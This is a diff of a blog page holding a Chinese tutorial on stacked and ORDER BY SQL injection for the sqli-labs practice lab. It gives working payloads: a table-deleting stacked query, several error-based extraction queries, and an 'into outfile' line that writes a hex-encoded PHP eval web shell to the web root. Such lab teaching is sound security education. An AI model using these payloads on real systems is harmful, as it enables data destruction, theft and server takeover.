+<h2 id="Tip-5-——-堆叠注入知识点"><a href="#Tip-5-——-堆叠注入知识点" class="headerlink" title="Tip 5 —— 堆叠注入知识点"></a>Tip 5 —— 堆叠注入知识点</h2><p>Stacked injections：堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ;  表示语句结束。这样我们就想到了是不是可以多句一起使用</p>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句</p>
+<p><code>mysql_query()</code>函数只能执行<code>一个</code>sql语句，而<code>mysqli_multi_query()</code>函数可以执行<code>多个</code>sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query() 和 mysqli_multi_query()</span><br></pre></td></tr></table></figure>
+<p>例如以下这个例子。用户输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1; DELETE FROM products</span><br></pre></td></tr></table></figure>
+<p>服务器端生成的sql语句为：（因未对输入的参数进行过滤）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from products where productid=1;DELETE FROM products</span><br></pre></td></tr></table></figure>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<h2 id="Tip-6-——-order-by注入知识点"><a href="#Tip-6-——-order-by注入知识点" class="headerlink" title="Tip 6 —— order by注入知识点"></a>Tip 6 —— order by注入知识点</h2><p>这里将结合Less46的截图来讲解原理</p>
+<p>order by注入传入的参数是<code>sort</code>，一般有以下几种方式进行注入</p>
+<p>①直接添加注入语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=(select **)</span><br></pre></td></tr></table></figure>
+<p>②rand()：利用两种结果来进行盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(sql语句)</span><br><span class="line"></span><br><span class="line">Ps：rand(ture)和rand(false)的结果是不一样的</span><br></pre></td></tr></table></figure>
+<p>③and：后面添加sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and (sql语句)</span><br></pre></td></tr></table></figure>
+<p>④报错注入</p>
+<p>双查询报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))</span><br></pre></td></tr></table></figure>
+<p>procedure analyse()：前面不用跟and</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 procedure analyse(extractvalue(1,concat(0x3a,database())),1)</span><br></pre></td></tr></table></figure>
+<p>extractvalue()：前面要跟and</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and extractvalue(1,concat(0x3a,database(),0x3a))</span><br></pre></td></tr></table></figure>
+<p>updatexml()：比extractvalue()多了一个<code>,1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 updatexml(1,concat(0x3a,database(),0x3a),1)</span><br></pre></td></tr></table></figure>
+<p>⑤into outfile：写马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;C:/phpStudy/WWW/shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e</span><br></pre></td></tr></table></figure>
 
       
 
@@ -598,11 +929,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -610,19 +941,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web渗透</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Web渗透</a>
               </li>
              
               <li class="article-tag-list-item">
